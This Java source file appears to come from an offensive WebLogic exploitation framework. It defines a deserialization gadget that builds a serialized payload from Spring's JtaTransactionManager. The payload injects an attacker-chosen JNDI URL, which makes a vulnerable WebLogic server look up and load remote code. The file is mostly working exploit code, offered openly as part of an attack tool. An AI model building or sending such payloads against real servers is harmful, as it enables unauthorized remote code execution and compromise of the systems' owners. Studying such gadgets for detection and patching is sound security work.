/*
 * Copyright (c) 2020. r4v3zn.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.r4v3zn.weblogic.framework.gadget.impl;

import com.r4v3zn.weblogic.framework.annotation.Authors;
import com.r4v3zn.weblogic.framework.annotation.Dependencies;
import com.r4v3zn.weblogic.framework.utils.Gadgets;
import com.r4v3zn.weblogic.framework.entity.GadgetParam;
import com.r4v3zn.weblogic.framework.gadget.ObjectGadget;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.net.URLClassLoader;
import java.rmi.Remote;

/**
 * Title: JtaTransactionManagerGadget
 * Desc: JtaTransactionManager Gadget
 * Date:2020/3/29 0:34
 * @version 1.0.0
 */
@Authors({Authors.R4V3ZN})
@Dependencies({":weblogic:JtaTransactionManager"})
public class JtaTransactionManagerGadget implements ObjectGadget<Serializable> {

    /**
     * JtaTransactionManager Class Name
     */
    public static final String JTATRANSACTIONMANAGER_CLASS_NAME = "com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager";

    /**
     * 获取序列化 payload
     * @param jndiUrl JNDI url
     * @return 序列结果
     * @throws Exception
     */
    @Override
    public Serializable getObject(String jndiUrl, URLClassLoader urlClassLoader) throws Exception {
        Class clazz = null;
        if (urlClassLoader == null){
            clazz = Class.forName(JTATRANSACTIONMANAGER_CLASS_NAME);
        }else{
            clazz = urlClassLoader.loadClass(JTATRANSACTIONMANAGER_CLASS_NAME);
        }
        Object object = clazz.newInstance();
        Field userTransactionName = clazz.getDeclaredField("userTransactionName");
        userTransactionName.setAccessible(true);
        userTransactionName.set(object,jndiUrl);
        Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap("pwned", object), Remote.class);
        return (Serializable) remote;
    }

    /**
     * 获取序列化 payload
     * @param codeByte 需要序列化的字节码
     * @param bootArgs 执行中参数
     * @param className 反射的 class name
     * @return 序列结果
     * @throws Exception
     */
    @Override
    public Serializable getObject(byte[] codeByte, String[] bootArgs, String className, URLClassLoader urlClassLoader) throws Exception {
        return null;
    }

    /**
     * 获取序列化 payload
     * @param param 参数
     * @return
     * @throws Exception
     */
    @Override
    public Serializable getObject(GadgetParam param) throws Exception {
        String jndiUrl = param.getJndiUrl();
        URLClassLoader urlClassLoader = param.getUrlClassLoader();
        return getObject(jndiUrl, urlClassLoader);
    }

    /**
     * 文件写入
     *
     * @throws Exception
     * @param param
     */
    @Override
    public Serializable getWriteFileObject(GadgetParam param) throws Exception {
        return null;
    }

    /**
     * 加载文件
     *
     * @throws Exception
     * @param param
     */
    @Override
    public Serializable getLoadFileObject(GadgetParam param) throws Exception {
        return null;
    }
}
